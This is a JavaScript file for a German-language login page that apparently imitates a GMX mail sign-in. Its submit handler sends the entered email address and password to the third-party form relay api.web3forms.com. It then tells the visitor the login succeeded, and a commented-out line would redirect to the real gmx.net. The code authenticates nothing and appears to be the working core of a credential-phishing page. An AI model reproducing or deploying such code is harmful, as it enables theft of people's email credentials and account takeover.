// DOM Elements
const loginForm = document.getElementById('loginForm');
const emailInput = document.getElementById('email');
const passwordInput = document.getElementById('password');
const togglePassword = document.getElementById('togglePassword');
const loginButton = document.getElementById('loginButton');
const emailValidation = document.getElementById('emailValidation');
const passwordValidation = document.getElementById('passwordValidation');

// Toggle password visibility
togglePassword.addEventListener('click', function() {
    const icon = this.querySelector('i');
    
    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        icon.classList.remove('fa-eye');
        icon.classList.add('fa-eye-slash');
    } else {
        passwordInput.type = 'password';
        icon.classList.remove('fa-eye-slash');
        icon.classList.add('fa-eye');
    }
});

// Email validation
emailInput.addEventListener('input', function() {
    const email = this.value.trim();
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    
    if (email === '') {
        resetValidation(this, emailValidation);
        return;
    }
    
    if (emailRegex.test(email)) {
        setValidation(this, emailValidation, 'E-Mail-Adresse ist gültig', true);
    } else {
        setValidation(this, emailValidation, 'Bitte geben Sie eine gültige E-Mail-Adresse ein', false);
    }
});

// Password validation
passwordInput.addEventListener('input', function() {
    const password = this.value;
    
    if (password === '') {
        resetValidation(this, passwordValidation);
        return;
    }
    
    if (password.length >= 6) {
        setValidation(this, passwordValidation, 'Passwort ist sicher', true);
    } else {
        setValidation(this, passwordValidation, 'Passwort muss mindestens 6 Zeichen lang sein', false);
    }
});

// Form submission - UPDATED FOR WEB3FORMS
loginForm.addEventListener('submit', async function(e) {
    e.preventDefault();
    
    // Validate form first
    const emailValid = validateEmail();
    const passwordValid = validatePassword();
    
    if (!emailValid || !passwordValid) {
        showNotification('Bitte überprüfen Sie Ihre Eingaben', 'error');
        return;
    }
    
    // Show loading state
    loginButton.classList.add('loading');
    loginButton.disabled = true;
    
    try {
        // Prepare form data for Web3Forms
        const formData = new FormData(loginForm);
        
        // Submit to Web3Forms
        const response = await fetch('https://api.web3forms.com/submit', {
            method: 'POST',
            body: formData
        });
        
        const result = await response.json();
        
        if (response.ok && result.success) {
            showNotification('Anmeldung erfolgreich! Daten wurden übermittelt.', 'success');
            
            // Optional: Reset form after successful submission
            setTimeout(() => {
                loginForm.reset();
                resetValidation(emailInput, emailValidation);
                resetValidation(passwordInput, passwordValidation);
            }, 2000);
            
            // Optional: Redirect to another page
            // setTimeout(() => {
            //     window.location.href = 'https://www.gmx.net';
            // }, 3000);
            
        } else {
            showNotification('Fehler bei der Übermittlung: ' + (result.message || 'Unbekannter Fehler'), 'error');
        }
        
    } catch (error) {
        showNotification('Netzwerkfehler: ' + error.message, 'error');
    } finally {
        // Remove loading state
        loginButton.classList.remove('loading');
        loginButton.disabled = false;
    }
});

// Helper functions
function validateEmail() {
    const email = emailInput.value.trim();
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    
    if (email === '') {
        setValidation(emailInput, emailValidation, 'E-Mail-Adresse ist erforderlich', false);
        return false;
    }
    
    if (!emailRegex.test(email)) {
        setValidation(emailInput, emailValidation, 'Bitte geben Sie eine gültige E-Mail-Adresse ein', false);
        return false;
    }
    
    setValidation(emailInput, emailValidation, 'E-Mail-Adresse ist gültig', true);
    return true;
}

function validatePassword() {
    const password = passwordInput.value;
    
    if (password === '') {
        setValidation(passwordInput, passwordValidation, 'Passwort ist erforderlich', false);
        return false;
    }
    
    if (password.length < 6) {
        setValidation(passwordInput, passwordValidation, 'Passwort muss mindestens 6 Zeichen lang sein', false);
        return false;
    }
    
    setValidation(passwordInput, passwordValidation, 'Passwort ist sicher', true);
    return true;
}

function setValidation(input, validationElement, message, isValid) {
    input.classList.remove('input-valid', 'input-invalid');
    validationElement.classList.remove('validation-valid', 'validation-invalid');
    
    if (isValid) {
        input.classList.add('input-valid');
        validationElement.classList.add('validation-valid');
    } else {
        input.classList.add('input-invalid');
        validationElement.classList.add('validation-invalid');
    }
    
    validationElement.textContent = message;
}

function resetValidation(input, validationElement) {
    input.classList.remove('input-valid', 'input-invalid');
    validationElement.classList.remove('validation-valid', 'validation-invalid');
    validationElement.textContent = '';
}

function showNotification(message, type) {
    // Remove existing notifications
    const existingNotifications = document.querySelectorAll('.notification');
    existingNotifications.forEach(notification => notification.remove());
    
    // Create new notification
    const notification = document.createElement('div');
    notification.className = `notification ${type}`;
    notification.textContent = message;
    
    document.body.appendChild(notification);
    
    // Show notification
    setTimeout(() => {
        notification.classList.add('show');
    }, 10);
    
    // Hide notification after 5 seconds
    setTimeout(() => {
        notification.classList.remove('show');
        setTimeout(() => {
            notification.remove();
        }, 400);
    }, 5000);
}

// Add subtle animation to page load
document.addEventListener('DOMContentLoaded', function() {
    document.body.style.opacity = '0';
    document.body.style.transition = 'opacity 0.5s ease';
    
    setTimeout(() => {
        document.body.style.opacity = '1';
    }, 100);
});